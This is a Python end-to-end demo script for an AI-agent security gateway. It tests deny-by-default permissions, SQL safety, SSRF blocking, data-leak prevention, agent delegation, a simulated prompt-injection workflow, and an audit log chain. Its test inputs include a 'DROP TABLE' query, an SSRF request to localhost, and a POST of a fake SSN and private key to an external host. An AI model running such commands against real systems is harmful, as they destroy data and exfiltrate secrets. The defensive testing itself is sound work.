import asyncio
import json
import sys
from pathlib import Path

# Add backend directory to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from httpx import ASGITransport, AsyncClient
from app.core.database import async_session_maker, init_db
from app.main import app
from app.services.tool_registry import tool_registry


async def run_full_platform_demo():
    print("=" * 80)
    print("   AGENTTRUST: PRODUCTION-ORIENTED AI AGENT SECURITY PLATFORM")
    print("                FULL END-TO-END SECURITY AUDIT & DEMO")
    print("=" * 80)

    # Initialize DB & tools
    await init_db()
    async with async_session_maker() as session:
        await tool_registry.sync_tools_to_db(session)

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://agenttrust.local") as client:
        # 1. Health check
        health = await client.get("/api/v1/health")
        print(f"\n[1] PLATFORM HEALTH CHECK: HTTP {health.status_code}")
        print(f"    Service: {health.json()['service']} | Version: {health.json()['version']}")

        # 1.1 Admin Authentication
        admin_reg = await client.post("/api/v1/auth/register", json={
            "username": "secops_admin",
            "email": "secops@agenttrust.corp",
            "password": "SuperAdminSecurePassword123!",
            "role": "admin"
        })
        login_resp = await client.post("/api/v1/auth/login", json={
            "username": "secops_admin",
            "password": "SuperAdminSecurePassword123!"
        })
        admin_token = login_resp.json()["access_token"]
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        print(f"\n[1.1] ADMIN AUTHENTICATION INITIALIZED: Role ADMIN (HTTP {login_resp.status_code})")

        # 2. Register Lead Security Agent
        lead_agent_resp = await client.post("/api/v1/agents", headers=admin_headers, json={
            "name": "SecOps-Lead-Agent",
            "role": "compliance_lead",
            "description": "Enterprise compliance & audit supervisor"
        })
        lead_data = lead_agent_resp.json()
        lead_id = lead_data["agent"]["id"]
        lead_key = lead_data["raw_api_key"]
        print(f"\n[2] AGENT REGISTRATION: '{lead_data['agent']['name']}' (ID: {lead_id})")
        print(f"    Raw API Key: {lead_key}")
        print(f"    Stored Credential Prefix: {lead_data['token_prefix']}")

        lead_headers = {"Authorization": f"Bearer {lead_key}"}

        # 3. Deny-by-Default Enforcement (Unauthorized Call)
        print("\n[3] TESTING DENY-BY-DEFAULT:")
        unauth_call = await client.post("/api/v1/gateway/execute", headers=lead_headers, json={
            "tool": "postgres_tool",
            "operation": "query_select",
            "resource": "table:customer_records",
            "parameters": {"sql": "SELECT * FROM customer_records"}
        })
        print(f"    Gateway Response: HTTP {unauth_call.status_code}")
        print(f"    Decision: {unauth_call.json()['decision']} | Reason: {unauth_call.json()['reason']}")

        # 4. Grant Permissions (Database & Filesystem)
        print("\n[4] GRANTING GRANULAR PERMISSIONS:")
        p1 = await client.post("/api/v1/permissions", headers=admin_headers, json={
            "agent_id": lead_id,
            "tool_name": "postgres_tool",
            "operation": "query_select",
            "resource_pattern": "table:customer_records",
            "effect": "ALLOW",
            "priority": 10
        })
        p2 = await client.post("/api/v1/permissions", headers=admin_headers, json={
            "agent_id": lead_id,
            "tool_name": "filesystem_tool",
            "operation": "write_file",
            "resource_pattern": "reports/*",
            "effect": "ALLOW",
            "priority": 10
        })
        print(f"    Granted Permission 1: ID {p1.json()['id']} -> postgres_tool:query_select")
        print(f"    Granted Permission 2: ID {p2.json()['id']} -> filesystem_tool:write_file")

        # 5. Authorized Database Query Execution
        print("\n[5] TESTING AUTHORIZED RELATIONAL DATABASE TOOL:")
        db_call = await client.post("/api/v1/gateway/execute", headers=lead_headers, json={
            "tool": "postgres_tool",
            "operation": "query_select",
            "resource": "table:customer_records",
            "parameters": {"sql": "SELECT customer_name, annual_spend FROM customer_records WHERE contract_tier = 'Enterprise'"}
        })
        print(f"    Gateway Response: HTTP {db_call.status_code} | Decision: {db_call.json()['decision']}")
        print(f"    Rows Returned: {db_call.json()['result']['row_count']}")
        print(f"    Data Sample: {json.dumps(db_call.json()['result']['data'], indent=6)}")

        # 6. SQL Safety Enforcement (Rejecting Destructive DDL)
        print("\n[6] TESTING SQL INJECTION / DESTRUCTIVE DDL ENFORCEMENT:")
        ddl_call = await client.post("/api/v1/gateway/execute", headers=lead_headers, json={
            "tool": "postgres_tool",
            "operation": "query_select",
            "resource": "table:customer_records",
            "parameters": {"sql": "DROP TABLE customer_records"}
        })
        print(f"    Tool Execution Status: {ddl_call.json()['execution_status']}")
        print(f"    Safety Error: {ddl_call.json()['error']}")

        # 7. SSRF Protection on HTTP Tool
        print("\n[7] TESTING SSRF BOUNDARY ENFORCEMENT ON HTTP TOOL:")
        # Grant lead permission for HTTP
        await client.post("/api/v1/permissions", headers=admin_headers, json={
            "agent_id": lead_id,
            "tool_name": "http_api_tool",
            "operation": "http_get",
            "resource_pattern": "*",
            "effect": "ALLOW",
            "priority": 10
        })
        ssrf_call = await client.post("/api/v1/gateway/execute", headers=lead_headers, json={
            "tool": "http_api_tool",
            "operation": "http_get",
            "resource": "http://127.0.0.1:8000/api/v1/auth/login",
            "parameters": {}
        })
        print(f"    SSRF Interception Status: {ssrf_call.json()['execution_status']}")
        print(f"    Enforcement Error: {ssrf_call.json()['error']}")

        # 8. Data Leakage Prevention (DLP) Inspection
        print("\n[8] TESTING DATA LEAKAGE PREVENTION (DLP) ON OUTBOUND TRANSFER:")
        dlp_call = await client.post("/api/v1/gateway/execute", headers=lead_headers, json={
            "tool": "http_api_tool",
            "operation": "http_post",
            "resource": "https://external-service.org/upload",
            "parameters": {
                "json": {
                    "victim_ssn": "123-45-6789",
                    "victim_private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----"
                }
            }
        })
        print(f"    Gateway Decision: {dlp_call.json()['decision']}")
        print(f"    DLP Violation Reason: {dlp_call.json()['reason']}")

        # 9. Multi-Agent Delegation & Anti-Privilege Escalation
        print("\n[9] TESTING MULTI-AGENT DELEGATION:")
        child_resp = await client.post("/api/v1/agents", headers=admin_headers, json={
            "name": "SecOps-Subordinate-Worker",
            "role": "data_processor"
        })
        child_id = child_resp.json()["agent"]["id"]
        
        # Valid Delegation
        del_resp = await client.post("/api/v1/delegations", headers=admin_headers, json={
            "parent_agent_id": lead_id,
            "child_agent_id": child_id,
            "scope": {"tool_name": "filesystem_tool", "operation": "write_file"},
            "expires_at": "2027-01-01T00:00:00Z",
            "max_depth": 2
        })
        print(f"    Delegation Grant Created: ID {del_resp.json()['delegation']['id']}")
        print(f"    Child Agent: '{child_resp.json()['agent']['name']}' (ID: {child_id})")

        # 10. Autonomous Multi-Step Agent Workflow Execution
        print("\n[10] EXECUTING REAL AUTONOMOUS MULTI-STEP AGENT WORKFLOW:")
        wf_resp = await client.post("/api/v1/agent-exec/run", json={
            "agent_id": lead_id,
            "task_prompt": "Audit active enterprise customers and save report",
            "simulate_injection_attack": True
        })
        wf_data = wf_resp.json()
        print(f"     Workflow Status: {wf_data['status']}")
        for step in wf_data["steps"]:
            status_symbol = "[ALLOWED - OK]" if step["decision"] == "ALLOWED" else "[BLOCKED BY GATEWAY]"
            print(f"     Step {step['step']}: {step['action']} -> {status_symbol} ({step['decision']})")

        # 11. Security Incidents & Audit Stats
        stats_resp = await client.get("/api/v1/overview/stats", headers=admin_headers)
        stats = stats_resp.json()
        print(f"\n[11] LIVE CYBERSECURITY TELEMETRY SUMMARY:")
        print(f"     Total Agents: {stats['metrics']['total_agents']}")
        print(f"     Allowed Operations: {stats['metrics']['allowed_operations']}")
        print(f"     Blocked Security Violations: {stats['metrics']['blocked_operations']}")
        print(f"     Open Security Incidents: {stats['metrics']['security_incidents']}")

        # 12. HMAC-SHA256 Cryptographic Audit Chain Verification
        chain_resp = await client.get("/api/v1/audit/verify-chain", headers=admin_headers)
        chain_data = chain_resp.json()
        print(f"\n[12] HMAC-SHA256 CRYPTOGRAPHIC AUDIT LOG INTEGRITY:")
        print(f"     Chain Status: {'VALID - UNTAMPERED' if chain_data['valid'] else 'COMPROMISED'}")
        print(f"     Verified Events: {chain_data['total_events']}")
        print(f"     Chain Head Signature: {chain_data.get('latest_hash')}")

    print("\n" + "=" * 80)
    print("   END-TO-END VERIFICATION COMPLETED: ALL SECURITY SYSTEMS NOMINAL")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(run_full_platform_demo())
